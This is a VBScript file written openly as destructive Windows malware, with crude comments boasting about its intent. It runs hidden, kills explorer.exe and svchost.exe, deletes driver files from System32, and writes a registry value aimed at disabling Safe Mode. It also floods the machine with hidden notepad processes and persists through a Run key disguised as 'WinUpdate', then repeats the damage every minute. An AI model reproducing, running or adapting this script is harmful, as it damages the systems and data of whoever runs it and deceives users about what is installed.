' Sneaky fucker to make Windows cry
Option Explicit
Dim x7p9q, q3z8k, k9m2v, r4t6y
Set x7p9q = CreateObject("WScript.Shell") ' Shell to run silent commands
Set q3z8k = CreateObject("Scripting.FileSystemObject") ' File system access

' Hide this shit from the user
x7p9q.Run "cmd.exe /c " & WScript.ScriptFullName, 0, False

' Kill critical processes to fuck up the system
x7p9q.Run "taskkill /F /IM explorer.exe", 0, True ' Crash the desktop
x7p9q.Run "taskkill /F /IM svchost.exe", 0, True ' Break core services

' Delete some non-critical driver files to cause instability
On Error Resume Next
q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") ' Fuck with power management
q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") ' Break CD/DVD access
On Error GoTo 0

' Fuck the registry to disable safe mode
Set k9m2v = CreateObject("WScript.Shell")
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD"

' Overload the system with bullshit processes
For r4t6y = 1 To 100
    x7p9q.Run "notepad.exe", 0, False ' Spawn endless notepads in the background
Next

' Make this shit persistent
k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", WScript.ScriptFullName, "REG_SZ"

' Keep it looping to ensure chaos
Do
    WScript.Sleep 60000 ' Wait a minute, then fuck shit up again
    x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
    For r4t6y = 1 To 50
        x7p9q.Run "notepad.exe", 0, False
    Next
Loop